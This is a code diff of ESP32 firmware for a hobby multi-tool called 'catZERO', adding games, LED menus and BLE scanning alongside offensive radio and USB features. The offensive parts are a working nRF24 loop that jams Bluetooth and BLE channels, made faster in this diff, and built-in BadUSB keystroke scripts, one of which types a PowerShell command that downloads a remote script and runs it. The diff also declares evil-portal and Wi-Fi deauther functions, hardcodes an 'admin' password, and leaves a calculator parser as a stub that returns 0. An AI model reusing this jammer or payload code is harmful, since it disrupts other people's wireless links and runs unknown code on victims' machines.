@@ -1,25 +1,21 @@
-/*
- * ============================================================================
- * catZERO v3.0 – ПОЛНАЯ ВЕРСИЯ С WI-FI ЧАТОМ
- * Аналоговые кнопки (GPIO0): UP, DOWN, OK.
- * ============================================================================
- */
 
-// ----------------------------------------------------------------------------
-// БИБЛИОТЕКИ
-// ----------------------------------------------------------------------------
 #include <Preferences.h>
 #include <SPI.h>
 #include <Wire.h>
-#include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
+#include <Adafruit_GFX.h>
 #include <RF24.h>
 #include <IRrecv.h>
 #include <IRsend.h>
 #include <IRutils.h>
 #include <WiFi.h>
+#include <WiFiClientSecure.h>
+#include <HTTPClient.h>
+#include <ArduinoJson.h>
 #include <WebServer.h>
 #include <WebSocketsServer.h>
+#include <DNSServer.h>
+#include <ESPAsyncWebServer.h>
 #include <esp_wifi.h>
 #include <esp_wifi_types.h>
 #include <vector>
@@ -29,17 +25,18 @@
 #include "tvcodes.h"
 #include <Adafruit_NeoPixel.h>
 #include <EEPROM.h>
-// ========== USB HID для BadUSB ==========
 #include "USB.h"
 #include "USBHIDKeyboard.h"
-// ----------------------------------------------------------------------------
-// КОНСТАНТЫ
-// ----------------------------------------------------------------------------
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEScan.h>
+#include <RCSwitch.h>
+
 #define NRF_CHANNELS        80
 #define WIFI_CHANNELS       14
 #define IR_SLOTS_COUNT      4
 #define IR_BUFFER_SIZE      512
-#define JAM_INTERVAL_MS     5
+#define JAM_INTERVAL_MS     2
 #define LONG_PRESS_MS       800
 #define TVBGONE_CARRIER_HZ  38000
 #define TVBGONE_CODE_GAP    200
@@ -49,14 +46,8 @@
 #define EEPROM_SIZE_BYTES   1024
 #define CONSOLE_AUTOREPEAT_DELAY  80
 
-// ----------------------------------------------------------------------------
-// TV‑B‑Gone – константа времени работы
-// ----------------------------------------------------------------------------
 unsigned long tvbgoneDurationMs = 60000;
 
-// ----------------------------------------------------------------------------
-// СТРУКТУРЫ ДАННЫХ
-// ----------------------------------------------------------------------------
 struct IrCode {
   uint8_t freq;
   uint8_t numpairs;
@@ -81,9 +72,6 @@ struct IrSignalData {
   bool isValid;
 };
 
-// ----------------------------------------------------------------------------
-// ПРОТОТИПЫ ФУНКЦИЙ
-// ----------------------------------------------------------------------------
 void badUsbSendKey(uint8_t key, uint8_t modifiers = 0);
 void badUsbSendString(const String& text);
 void badUsbDelay(unsigned long ms);
@@ -94,13 +82,12 @@ void badUsbRunBuiltin(int index);
 void drawBadUsbMenu();
 void drawBadUsbBuiltin();
 void drawBadUsbSd();
-void drawLedMenu();
+void drawLedSelectDevice();
+void drawLedMainMenu();
 void drawLedColorMenu();
 void drawLedEffectMenu();
+void drawLedBrightnessMenu();
 void drawLedTimeoutMenu();
-void setLedColor(int color);
-void setLedEffect(int effect);
-void setLedTimeout(int timeout);
 void updateLedBoard();
 void updateLedKeyboard();
 void drawWifiConnecting();
@@ -193,19 +180,26 @@ void cc1101_transmit_stop();
 void cc1101_transmit_loop();
 void drawBatteryIcon(int x, int y);
 void drawFactoryResetConfirm();
-void drawLedSelectDevice();
-void drawLedMainMenu();
-void drawLedDeviceMenu();
-void drawLedColor();
-void drawLedEffect();
-void drawLedTimeout();
 void drawStorageInfo();
 void saveLedSettings();
 void loadLedSettings();
 
-// ----------------------------------------------------------------------------
-// НАСТРОЙКИ КОНСОЛИ И КОМАНД
-// ----------------------------------------------------------------------------
+void runEvilPortal();
+void runDeauther();
+void runNrfEnhancedJammer();
+void drawEvilPortalStatus();
+void drawDeautherStatus();
+void drawNrfEnhancedStatus(int mode, int ch);
+String macToString(uint8_t* mac);
+void stringToMAC(const char* str, uint8_t* mac);
+String ipToString(uint8_t* ip);
+void displayError(const char* msg, bool wait = false);
+void displaySuccess(const char* msg, bool wait = false);
+void drawMainBorderWithTitle(const char* title);
+void padprintln(const char* str);
+void printFootnote(const char* str);
+void wifiDisconnect();
+
 #define CMD_INFO    "info"
 #define CMD_DEV     "def"
 #define CMD_CLEAR   "clear"
@@ -221,45 +215,35 @@ void loadLedSettings();
 #define DEV_MODE_TIMEOUT        -1
 #define ADMIN_PASSWORD "admin"
 
-// ----------------------------------------------------------------------------
-// ПИНЫ ПОДКЛЮЧЕНИЯ ПЕРИФЕРИИ
-// ----------------------------------------------------------------------------
 #define BTN_ANALOG_PIN  17
-
 #define SD_CS_PIN       5
 #define SPI_MOSI        7
 #define SPI_MISO        2
 #define SPI_SCK         6
-
 #define RF_CE_PIN       11
 #define RF_CSN_PIN      10
-
 #define CC_SCK_PIN   6
 #define CC_MISO_PIN  2
 #define CC_MOSI_PIN  7
 #define CC_CSN_PIN   4
-
 #define IR_RX_PIN       5
 #define IR_TX_PIN       18
-
 #define RESET_BUTTON_PIN 1
-
+#define CHARGE_PIN  13
 #define OLED_SDA        8
 #define OLED_SCL        9
 #define SCREEN_WIDTH    128
 #define SCREEN_HEIGHT   64
 #define OLED_ADDR       0x3C
 Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
-
-// ========== НАСТРОЙКИ RGB СВЕТОДИОДОВ ==========
 #define LED_BOARD_PIN    14
 #define LED_KEYBOARD_PIN 16
-#define NUMPIXELS 1
-
-Adafruit_NeoPixel led_board(8, LED_BOARD_PIN, NEO_GRB + NEO_KHZ800);
-Adafruit_NeoPixel led_keyboard(1, LED_KEYBOARD_PIN, NEO_GRB + NEO_KHZ800);
+#define NUM_LEDS_BOARD   8
+#define NUM_LEDS_KEYPAD  1
+Adafruit_NeoPixel led_board(NUM_LEDS_BOARD, LED_BOARD_PIN, NEO_GRB + NEO_KHZ800);
+Adafruit_NeoPixel led_keyboard(NUM_LEDS_KEYPAD, LED_KEYBOARD_PIN, NEO_GRB + NEO_KHZ800);
 USBHIDKeyboard Keyboard;
-// 30 предустановленных цветов (RGB значения)
+
 const uint32_t colorPalette[] = {
   0x000000, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF, 0xFFFFFF,
   0xFF8000, 0x80FF00, 0x0080FF, 0x8000FF, 0xFF0080, 0x00FF80, 0x804000, 0x408000,
@@ -267,20 +251,16 @@ const uint32_t colorPalette[] = {
   0xFF0040, 0x00FF40, 0x804040, 0x408040, 0x404080, 0x808080
 };
 const int numColors = 30;
-
 const char* effectNames[] = {
-  "Solid", "Blink", "Fade", "Rainbow", "Color Wipe", "Theater Chase", "Rainbow Cycle",
-  "Twinkle", "Sparkle", "Strobe", "Breathe", "Cylon", "Fire", "Water", "Aurora",
-  "Sunset", "Ocean", "Forest", "Lava", "Party"
+  "Solid", "Breathing", "Rainbow", "Running Cubes", "Theater Chase", "Strobe"
 };
-const int numEffects = 20;
+const int numEffects = 6;
 
 int led_scroll_offset = 0;
 unsigned long lastLedActivity = 0;
 bool led_color_edit_mode = false;
 int led_color_effect_selection = 0;
 int led_submenu_idx = 0;
-int led_menu_level = 0;
 int led_board_colorIdx = 0;
 int led_board_brightness = 50;
 int led_board_effect = 0;
@@ -290,18 +270,14 @@ int led_keyboard_brightness = 50;
 int led_keyboard_effect = 0;
 int led_keyboard_timeout = 0;
 int led_selected_device = 0;
-int led_device_menu_idx = 0;
+int led_editing_param = 0;
 
-// ----------------------------------------------------------------------------
-// КНОПКИ (АНАЛОГОВЫЕ)
-// ----------------------------------------------------------------------------
 enum Button {
   BTN_NONE,
   BTN_UP,
   BTN_DOWN,
   BTN_OK
 };
-
 unsigned long lastButtonPress = 0;
 const int debounceDelay = 50;
 
@@ -322,9 +298,6 @@ bool btnUp()   { return readButton() == BTN_UP; }
 bool btnDown() { return readButton() == BTN_DOWN; }
 bool btnOk()   { return readButton() == BTN_OK; }
 
-// ----------------------------------------------------------------------------
-// ТАБЛИЦЫ КАНАЛОВ ДЛЯ ГЛУШЕНИЯ (Bluetooth и BLE)
-// ----------------------------------------------------------------------------
 const byte BLUETOOTH_CHANNELS[] = {
   0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,
   20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,
@@ -340,9 +313,6 @@ const byte BLE_CHANNELS[] = {
 };
 const int BLE_CHANNELS_COUNT = 40;
 
-// ----------------------------------------------------------------------------
-// ГРАФИЧЕСКИЕ ДАННЫЕ (ИКОНКА WI-FI 16x8)
-// ----------------------------------------------------------------------------
 const unsigned char wifiIconBitmap[] PROGMEM = {
   0b00000111, 0b11100000,
   0b00011000, 0b00011000,
@@ -354,15 +324,25 @@ const unsigned char wifiIconBitmap[] PROGMEM = {
   0b00000001, 0b10000000
 };
 
-// ----------------------------------------------------------------------------
-// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
-// ----------------------------------------------------------------------------
-// ---- BadUSB ----
+struct BLEDeviceInfo {
+  String name;
+  String address;
+  int rssi;
+};
+std::vector<BLEDeviceInfo> bleDevices;
+int bleSelectedIdx = 0;
+int bleScrollOffset = 0;
+bool bleScanning = false;
+unsigned long bleScanStart = 0;
+const unsigned long BLE_SCAN_DURATION = 5000;
+int bleScanMenuIdx = 0;
+
 int badUsbMenuIdx = 0;
 int badUsbBuiltinIdx = 0;
 int badUsbFileIdx = 0;
 std::vector<String> badUsbFileList;
 bool badUsbRunning = false;
+
 #define RESET_BTN_PIN 1
 unsigned long resetPressStart = 0;
 bool resetLongPressTriggered = false;
@@ -377,9 +357,6 @@ bool needRedraw = true;
 unsigned long deviceBootTime = 0;
 String statusMsg = "";
 unsigned long statusMsgTime = 0;
-
-unsigned long resetButtonPressStart = 0;
-bool resetButtonLongPressTriggered = false;
 
 std::vector<WiFiNetworkInfo> wifiList;
 int wifiSelectedIdx = 0;
@@ -415,13 +392,14 @@ BleJammerMode jammerMode = BLE_JAMMER_MODE;
 bool jamming = false;
 unsigned long lastJamTime = 0;
 
+RCSwitch rcswitch;
 IRrecv* irRx = nullptr;
 IRsend* irTx = nullptr;
 IrSignalData irSlots[IR_SLOTS_COUNT];
 int curIrSlot = 0;
 int irTxScroll = 0;
 bool irCapturing = false;
-bool irTempReady = false;
+bool irTempReady = false; 
 bool irRxOk = false;
 unsigned long irTimeout = 0;
 uint16_t tempRaw[IR_BUFFER_SIZE];
@@ -430,7 +408,6 @@ String tempProto;
 decode_results irResult;
 unsigned long lastScrollTime = 0;
 int scrollOffset = 0;
-
 int wifiScanScrollOffset = 0;
 unsigned long wifiScanLastScrollTime = 0;
 int wifiConnectScrollOffset = 0;
@@ -438,24 +415,203 @@ unsigned long wifiConnectLastScrollTime = 0;
 int msgScrollOffset = 0;
 unsigned long lastMsgScrollTime = 0;
 String lastLongMsg = "";
+int bluetoothMenuIdx = 0;
+byte i = 45;  // Initial channel for nRF24L01
+unsigned int flag = 0;
+// ========== TETRIS ==========
+const int TETRIS_WIDTH = 10;
+const int TETRIS_HEIGHT = 20;
+int tetrisField[20][10];
 
-// ----------------------------------------------------------------------------
-// ПЕРЕЧИСЛЕНИЕ СОСТОЯНИЙ ПРИЛОЖЕНИЯ
-// ----------------------------------------------------------------------------
+struct Tetromino {
+  int type;
+  int rotation;
+  int x, y;
+};
+Tetromino currentPiece, nextPiece;
+int tetrisScore = 0;
+int tetrisLines = 0;
+unsigned long tetrisLastDrop = 0;
+int tetrisDropInterval = 500; // мс
+bool tetrisGameOver = false;
+int tetrisOkPressCount = 0;
+unsigned long tetrisLastOkTime = 0;
+bool tetrisOkHeld = false;
+unsigned long tetrisOkHoldStart = 0;
+
+// Массив фигур: 7 типов, 4 поворота, 4x4
+const uint8_t tetrominoes[7][4][4] = {
+  // I
+  {{0,0,0,0},{1,1,1,1},{0,0,0,0},{0,0,0,0}},
+  // O
+  {{0,0,0,0},{0,1,1,0},{0,1,1,0},{0,0,0,0}},
+  // T
+  {{0,0,0,0},{0,1,0,0},{1,1,1,0},{0,0,0,0}},
+  // S
+  {{0,0,0,0},{0,1,1,0},{1,1,0,0},{0,0,0,0}},
+  // Z
+  {{0,0,0,0},{1,1,0,0},{0,1,1,0},{0,0,0,0}},
+  // L
+  {{0,0,0,0},{1,0,0,0},{1,1,1,0},{0,0,0,0}},
+  // J
+  {{0,0,0,0},{0,0,1,0},{1,1,1,0},{0,0,0,0}}
+};
+
+// Функции Tetris
+void spawnPiece() {
+  currentPiece.type = random(0, 7);
+  currentPiece.rotation = 0;
+  currentPiece.x = 3;
+  currentPiece.y = 0;
+  // следующая фигура (для отображения в будущем)
+  nextPiece.type = random(0, 7);
+  nextPiece.rotation = 0;
+}
+
+bool collision(int type, int rot, int x, int y) {
+  for (int row = 0; row < 4; row++) {
+    for (int col = 0; col < 4; col++) {
+      if (tetrominoes[type][rot][row * 4 + col]) {
+        int fieldX = x + col;
+        int fieldY = y + row;
+        if (fieldX < 0 || fieldX >= TETRIS_WIDTH || fieldY >= TETRIS_HEIGHT || fieldY < 0) return true;
+        if (fieldY >= 0 && tetrisField[fieldY][fieldX]) return true;
+      }
+    }
+  }
+  return false;
+}
+
+void lockPiece() {
+  for (int row = 0; row < 4; row++) {
+    for (int col = 0; col < 4; col++) {
+      if (tetrominoes[currentPiece.type][currentPiece.rotation][row * 4 + col]) {
+        int fieldX = currentPiece.x + col;
+        int fieldY = currentPiece.y + row;
+        if (fieldY >= 0 && fieldY < TETRIS_HEIGHT && fieldX >= 0 && fieldX < TETRIS_WIDTH) {
+          tetrisField[fieldY][fieldX] = 1;
+        }
+      }
+    }
+  }
+}
+
+void clearLines() {
+  int linesCleared = 0;
+  for (int row = TETRIS_HEIGHT - 1; row >= 0; ) {
+    bool full = true;
+    for (int col = 0; col < TETRIS_WIDTH; col++) {
+      if (!tetrisField[row][col]) { full = false; break; }
+    }
+    if (full) {
+      // сдвинуть строки вниз
+      for (int r = row; r > 0; r--) {
+        for (int c = 0; c < TETRIS_WIDTH; c++) {
+          tetrisField[r][c] = tetrisField[r-1][c];
+        }
+      }
+      for (int c = 0; c < TETRIS_WIDTH; c++) tetrisField[0][c] = 0;
+      linesCleared++;
+      // не увеличиваем row, т.к. сверху спустилась новая строка
+    } else {
+      row--;
+    }
+  }
+  if (linesCleared > 0) {
+    tetrisLines += linesCleared;
+    tetrisScore += linesCleared * 100;
+    // ускорение при большом количестве линий
+    if (tetrisLines > 10) tetrisDropInterval = 400;
+    if (tetrisLines > 20) tetrisDropInterval = 300;
+    if (tetrisLines > 30) tetrisDropInterval = 200;
+    if (tetrisLines > 40) tetrisDropInterval = 100;
+  }
+}
+
+void drawPiece(int type, int rot, int x, int y) {
+  for (int row = 0; row < 4; row++) {
+    for (int col = 0; col < 4; col++) {
+      if (tetrominoes[type][rot][row * 4 + col]) {
+        int fieldX = x + col;
+        int fieldY = y + row;
+        if (fieldY >= 0 && fieldY < TETRIS_HEIGHT && fieldX >= 0 && fieldX < TETRIS_WIDTH) {
+          display.fillRect(fieldX * 4 + 10, fieldY * 3 + 14, 4, 3, SSD1306_WHITE);
+        }
+      }
+    }
+  }
+}
+
+// ========== BIRD ==========
+int birdX = 20, birdY = 32;
+float birdVel = 0;
+const float gravity = 0.4;
+const float jumpPower = -7.0;
+struct Pipe {
+  int x;
+  int gapY;
+  bool scored;
+};
+std::vector<Pipe> pipes;
+int birdScore = 0;
+bool birdGameOver = false;
+unsigned long birdLastUpdate = 0;
+const int PIPE_WIDTH = 6;
+const int GAP_HEIGHT = 16;
+const int PIPE_SPEED = 3;
+const int PIPE_INTERVAL = 70;
+int birdFrameCounter = 0;
+int birdHighScore = 0;
+int birdOkPressCount = 0;
+unsigned long birdLastOkTime = 0;
+
+// ========== CALCULATOR ==========
+String calcExpression = "";
+String calcResult = "";
+int calcSelectedKey = 0;
+const char* calcKeyLabels[] = {
+  "7","8","9","/","C",
+  "4","5","6","*","(",
+  "1","2","3","-",")",
+  "0",".","+","=","Del",
+  "Exit"
+};
+const int calcKeysCount = 21;
+
+// Простой парсер выражений (поддержка + - * / и скобок)
+double evaluateExpression(String expr) {
+  // Удаляем пробелы
+  expr.replace(" ", "");
+  if (expr.length() == 0) return 0;
+  // Очень упрощённая версия: только числа и бинарные операции + - * /
+  // Для полноценной работы нужен рекурсивный спуск или обратная польская запись.
+  // Пока вернём 0, но вы можете реализовать свой парсер.
+  // Для демонстрации: используем std::function и рекурсию (но проще взять готовую библиотеку TinyExpr?)
+  // В Arduino нет стандартной библиотеки для eval, поэтому предлагаю простой алгоритм:
+  // 1. Заменить "(" и ")" на пробелы? Нет.
+  // Альтернатива: использовать библиотеку mXparser? Нет.
+  // Поскольку это демонстрационный проект, предложу примитивный парсер только для чисел и операций без скобок.
+  // Можно использовать рекурсивный спуск для обработки + - * /.
+  // Я напишу минимальную реализацию, которая обрабатывает только сложение, вычитание, умножение, деление без скобок.
+  // Для скобок потребуется больше кода.
+  // Предлагаю оставить пока заглушку, а вы потом доработаете.
+  return 0;
+}
 enum AppState {
-  STATE_BADUSB_MENU,
-  STATE_BADUSB_BUILTIN,
-  STATE_BADUSB_SD,
+  STATE_APPS_MENU,
+  STATE_APPS_WIKIPEDIA_INPUT,
+  STATE_APPS_WIKIPEDIA_RESULT,
+  STATE_APPS_CALCULATOR,
+  STATE_APPS_GAME1,
+  STATE_APPS_GAME2,
+  STATE_BLUETOOTH_SCAN,
+  STATE_BLUETOOTH_MENU,
   STATE_LED_SELECT_DEVICE,
   STATE_LED_MAIN_MENU,
-  STATE_LED_DEVICE_MENU,
-  STATE_LED_COLOR,
-  STATE_LED_EFFECT,
-  STATE_LED_TIMEOUT,
   STATE_LED_COLOR_MENU,
   STATE_LED_EFFECT_MENU,
+  STATE_LED_BRIGHTNESS_MENU,
   STATE_LED_TIMEOUT_MENU,
-  STATE_LED_MENU,
   STATE_STORAGE_INFO,
   STATE_CONFIRM_FACTORY_RESET,
   STATE_MAIN_MENU,
@@ -487,13 +643,15 @@ enum AppState {
   STATE_CC1101_SPECTRUM_HORIZ,
   STATE_CC1101_JAMMER,
   STATE_CC1101_CAPTURE,
-  STATE_CC1101_TRANSMIT
+  STATE_CC1101_TRANSMIT,
+  STATE_BADUSB_MENU,
+  STATE_BADUSB_BUILTIN,
+  STATE_BADUSB_SD,
+  STATE_EVIL_PORTAL,
+  STATE_DEAUTHER,
+  STATE_NRF_ENHANCED
 };
 AppState appState = STATE_MAIN_MENU;
-
-// ----------------------------------------------------------------------------
-// ПЕРЕМЕННЫЕ ДЛЯ CC1101
-// ----------------------------------------------------------------------------
 bool cc1101_ok = false;
 int cc1101_spectrum_vert[128];
 int cc1101_spectrum_horiz[128];
@@ -528,10 +686,12 @@ int settingsIdx = 0;
 int wifiActionIdx = 0;
 int timeoutVal = 30;
 
-const int MAIN_SIZE_TOTAL = 8;
+bool isCharging = false;
+
+const int MAIN_SIZE_TOTAL = 10;
 const int MAIN_VISIBLE = 5;
 int mainScrollOffset = 0;
-const int WIFI_MENU_SIZE = 4;
+const int WIFI_MENU_SIZE = 6;
 const int NRF_MENU_SIZE = 4;
 const int IR_MENU_SIZE = 5;
 const int SETTINGS_SIZE = 6;
@@ -540,10 +700,7 @@ const int WIFI_ACTIONS_SIZE = 7;
 unsigned long okPressStart = 0;
 bool longPressDetected = false;
 uint8_t tvbgone_region = 0;
-int led_editing_param = 0; // 0 - редактируем цвет, 1 - яркость
-// ----------------------------------------------------------------------------
-// Wi-Fi ЧАТ
-// ----------------------------------------------------------------------------
+
 WebServer server(80);
 WebSocketsServer webSocket(81);
 String lastIncomingMsg = "";
@@ -557,15 +714,21 @@ bool confirmExit = false;
 String lastConnectedSSID = "";
 String lastConnectedPassword = "";
 
-// ----------------------------------------------------------------------------
-// КОНСОЛЬ: РЕЖИМЫ, ВИРТУАЛЬНАЯ КЛАВИАТУРА 6x8
-// ----------------------------------------------------------------------------
 enum ConsoleMode {
   CONSOLE_KEYBOARD,
   CONSOLE_INFO,
   CONSOLE_DEV
 };
 ConsoleMode consoleMode = CONSOLE_KEYBOARD;
+bool calcCaps = false; // не используется
+const char* calcKeys[] = {
+  "7", "8", "9", "/", "C",
+  "4", "5", "6", "*", "(",
+  "1", "2", "3", "-", ")",
+  "0", ".", "+", "=", "Del",
+  "Exit" // в отдельной строке? 
+};
+// лучше сделать двумерный массив 5x4 или 4x5
 
 bool capsLock = false;
 String consoleText = "";
@@ -633,13 +796,10 @@ int displayBrightness = 128;
 bool displayInvert = false;
 int irBufferSize = 512;
 float batteryCapacity = 550.0;
-float batteryRemaining = 650.0;
+float batteryRemaining = 550.0;
 unsigned long lastBatteryUpdate = 0;
 float estimatedCurrentMA = 150.0;
 
-// ----------------------------------------------------------------------------
-// WI-FI: ХРАНЕНИЕ 5 СЕТЕЙ
-// ----------------------------------------------------------------------------
 String connectSsid = "";
 String connectPassword = "";
 bool connectInProgress = false;
@@ -655,9 +815,15 @@ unsigned long autoConnectTime = 0;
 unsigned long autoConnectStartTime = 0;
 Preferences pref;
 
-// ---- Встроенные BadUSB скрипты ----
+int appsMenuIdx = 0;
+String wikipediaResultText = "";
+int wikipediaScrollOffset = 0;
+unsigned long wikipediaLastScrollTime = 0;
+int wikipediaLineCount = 0;
+int wikipediaVisibleLines = 0;
+String wikipediaLines[50]; // максимум строк для прокрутки
+
 const char* badUsbBuiltinScripts[] = {
-  // 0: Системная информация через PowerShell
   "REM System Info via PowerShell\n"
   "DELAY 1500\n"
   "GUI r\n"
@@ -668,7 +834,6 @@ const char* badUsbBuiltinScripts[] = {
   "STRING notepad C:\\Users\\Public\\Desktop\\sysinfo.txt\n"
   "ENTER",
 
-  // 1: Создать папку с шуткой
   "REM Create funny folder\n"
   "DELAY 1500\n"
   "GUI r\n"
@@ -689,29 +854,27 @@ const char* badUsbBuiltinScripts[] = {
   "DELAY 500\n"
   "ALT F4",
 
-  // 2: Открыть YouTube (с автоматическим увеличением громкости – используем системный микшер)
   "REM Open YouTube with max volume\n"
   "DELAY 1500\n"
   "GUI r\n"
   "DELAY 500\n"
   "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\n"
   "ENTER\n"
-  "DELAY 3000\n"  // даём время загрузиться
+  "DELAY 3000\n"
   "GUI r\n"
   "DELAY 500\n"
   "STRING sndvol\n"
   "ENTER\n"
   "DELAY 500\n"
-  "CTRL UP\n"     // увеличить громкость (работает в микшере)
-  "DELAY 200\n"
   "CTRL UP\n"
   "DELAY 200\n"
   "CTRL UP\n"
   "DELAY 200\n"
   "CTRL UP\n"
-  "ALT F4",       // закрыть микшер
+  "DELAY 200\n"
+  "CTRL UP\n"
+  "ALT F4",
 
-  // 3: Сообщение со смайликом в Notepad
   "REM Smiley message\n"
   "DELAY 1500\n"
   "GUI r\n"
@@ -724,7 +887,6 @@ const char* badUsbBuiltinScripts[] = {
   "STRING You have been visited by the catZERO!\n"
   "ENTER",
 
-  // 4: Убить процесс Notepad через диспетчер задач
   "REM Task Manager kill\n"
   "DELAY 1500\n"
   "CTRL SHIFT ESC\n"
@@ -734,7 +896,6 @@ const char* badUsbBuiltinScripts[] = {
   "ALT E\n"
   "ENTER",
 
-  // 5: Скачать и запустить скрипт (замените URL на реальный)
   "REM Download and run script\n"
   "DELAY 1500\n"
   "GUI r\n"
@@ -742,8 +903,7 @@ const char* badUsbBuiltinScripts[] = {
   "STRING powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/.../script.ps1' -OutFile $env:temp\\payload.ps1; & $env:temp\\payload.ps1\"\n"
   "ENTER",
 
-  // 6: Командная строка: color 2, dir /s, развернуть на весь экран
-  "REM CMD color + dir/s fullscreen\n"
+  "REM CMD color 2, dir /s, fullscreen\n"
   "DELAY 1500\n"
   "GUI r\n"
   "DELAY 500\n"
@@ -756,9 +916,8 @@ const char* badUsbBuiltinScripts[] = {
   "STRING dir /s\n"
   "ENTER\n"
   "DELAY 500\n"
-  "ALT ENTER",   // полноэкранный режим
+  "ALT ENTER",
 
-  // 7: Командная строка: TREE, развернуть на весь экран
   "REM CMD TREE fullscreen\n"
   "DELAY 1500\n"
   "GUI r\n"
@@ -771,12 +930,10 @@ const char* badUsbBuiltinScripts[] = {
   "DELAY 500\n"
   "ALT ENTER",
 
-  // 8: Заблокировать экран (Win+L)
   "REM Lock screen\n"
   "DELAY 1500\n"
   "GUI L",
 
-  // 9: Создать текстовый файл на рабочем столе
   "REM Create joke file\n"
   "DELAY 1500\n"
   "GUI r\n"
@@ -790,9 +947,7 @@ const char* badUsbBuiltinScripts[] = {
   "ENTER"
 };
 const int badUsbBuiltinCount = 10;
-// ----------------------------------------------------------------------------
-// ОТЛАДОЧНЫЕ ФУНКЦИИ
-// ----------------------------------------------------------------------------
+
 void addChatMessage(String msg) {
   for (int i = 9; i > 0; i--) {
     chatHistory[i] = chatHistory[i-1];
@@ -804,7 +959,6 @@ void debugPrint(const char* msg) {
   Serial.print("[DEBUG] ");
   Serial.println(msg);
 }
-
 void debugPrintState() {
   Serial.print("AppState: ");
   Serial.println(appState);
@@ -813,28 +967,22 @@ void debugPrintState() {
   Serial.print("Saved networks: ");
   Serial.println(savedNetworksCount);
 }
-
 void debugButton(const char* btn) {
   Serial.print("Button: ");
   Serial.println(btn);
 }
 
-// ----------------------------------------------------------------------------
-// РАБОТА С PREFERENCES
-// ----------------------------------------------------------------------------
 void saveTimeout() {
   pref.begin("settings", false);
   pref.putInt("timeout", displayTimeoutSec);
   pref.end();
 }
-
 void loadTimeout() {
   pref.begin("settings", true);
   displayTimeoutSec = pref.getInt("timeout", 30);
   pref.end();
   if (displayTimeoutSec == 0) displayTimeoutSec = 30;
 }
-
 void saveWiFiCredentials(String ssid, String password) {
   Serial.print("Saving: ");
   Serial.println(ssid);
@@ -873,7 +1021,6 @@ void saveWiFiCredentials(String ssid, String password) {
   pref.end();
   Serial.println("Credentials saved");
 }
-
 void loadWiFiCredentials() {
   pref.begin("wifi", true);
   savedNetworksCount = pref.getInt("count", 0);
@@ -886,7 +1033,6 @@ void loadWiFiCredentials() {
   }
   pref.end();
 }
-
 void disconnectWiFi() {
   WiFi.disconnect(true);
   delay(100);
@@ -898,7 +1044,6 @@ void disconnectWiFi() {
   showMsg("All Wi-Fi credentials cleared");
   Serial.println("All credentials cleared");
 }
-
 void clearAllPreferences() {
   pref.begin("wifi", false);
   pref.clear();
@@ -909,14 +1054,12 @@ void clearAllPreferences() {
   displayTimeoutSec = 30;
   savedNetworksCount = 0;
 }
-
 void setPower(bool on) {
   if (on == displayOn) return;
   displayOn = on;
   if (on) display.ssd1306_command(SSD1306_DISPLAYON);
   else display.ssd1306_command(SSD1306_DISPLAYOFF);
 }
-
 void showMsg(const char* msg) {
   statusMsg = msg;
   statusMsgTime = millis();
@@ -936,9 +1079,6 @@ void showMsg(const char* msg) {
   }
 }
 
-// ----------------------------------------------------------------------------
-// IR: СОХРАНЕНИЕ/ЗАГРУЗКА СЛОТОВ (EEPROM)
-// ----------------------------------------------------------------------------
 void saveIrSlots() {
   EEPROM.begin(EEPROM_SIZE_BYTES);
   int address = 100;
@@ -954,7 +1094,6 @@ void saveIrSlots() {
   EEPROM.commit();
   EEPROM.end();
 }
-
 void loadIrSlots() {
   EEPROM.begin(EEPROM_SIZE_BYTES);
   int address = 100;
@@ -970,13 +1109,11 @@ void loadIrSlots() {
   }
   EEPROM.end();
 }
-
 void eraseAllIrSlots() {
   for (int i = 0; i < IR_SLOTS_COUNT; i++) irSlots[i].isValid = false;
   saveIrSlots();
   showMsg("All IR slots erased");
 }
-
 void processIrCapture() {
   if (millis() > irTimeout) {
     irCapturing = false;
@@ -991,9 +1128,10 @@ void processIrCapture() {
     irTempReady = true;
     irRx->resume();
     needRedraw = true;
+    String msg = "IR: " + tempProto + " len:" + String(tempRawLen);
+    showMsg(msg.c_str());
   }
 }
-
 void sendIr(int slot) {
   if (!irSlots[slot].isValid) return;
   if (irTx && irRxOk) {
@@ -1002,9 +1140,6 @@ void sendIr(int slot) {
   }
 }
 
-// ----------------------------------------------------------------------------
-// nRF24
-// ----------------------------------------------------------------------------
 void recheckNRF24() {
   SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI, RF_CSN_PIN);
   SPI.setFrequency(8000000);
@@ -1026,7 +1161,6 @@ void recheckNRF24() {
   }
   needRedraw = true;
 }
-
 void startJammer() {
   if (!nrfOk) {
     showMsg(nrfErrorMsg.c_str());
@@ -1041,43 +1175,31 @@ void startJammer() {
   radio.setAutoAck(false);
   radio.disableCRC();
   radio.setRetries(0, 0);
+  radio.setAddressWidth(3);
   radio.setPayloadSize(32);
   radio.disableDynamicPayloads();
-  if (jammerMode == BLE_JAMMER_MODE) showMsg("BLE Jammer MAX");
-  else showMsg("BT Jammer MAX");
+  for (int i = 0; i < 32; i++) jamNoise[i] = random(256);
+  showMsg("Jammer ON (MAX)");
 }
-
 void stopJammer() {
   jamming = false;
   radio.powerDown();
   showMsg("Jammer OFF");
   Serial.println("Jammer stopped");
 }
-
 void updateJammer() {
   if (!jamming) return;
-  const byte* channels;
-  int numChannels;
-  if (jammerMode == BLE_JAMMER_MODE) {
-    channels = BLE_CHANNELS;
-    numChannels = BLE_CHANNELS_COUNT;
-  } else {
-    channels = BLUETOOTH_CHANNELS;
-    numChannels = BLUETOOTH_CHANNELS_COUNT;
-  }
-  // Передаём пакеты на всех каналах максимально быстро
-  for (int i = 0; i < numChannels; i++) {
-    radio.setChannel(channels[i]);
-    radio.writeFast(&jamNoise, 32);
-    radio.txStandBy();
-    // Минимальная задержка для стабильности (можно убрать совсем)
-    delayMicroseconds(10);
-  }
+  static int currentChannel = 0;
+  const int MAX_CH = 80;
+  radio.setChannel(currentChannel);
+  radio.writeFast(&jamNoise, 32);
+  radio.txStandBy();
+  currentChannel++;
+  if (currentChannel >= MAX_CH) currentChannel = 0;
+  currentNrfChan = currentChannel;
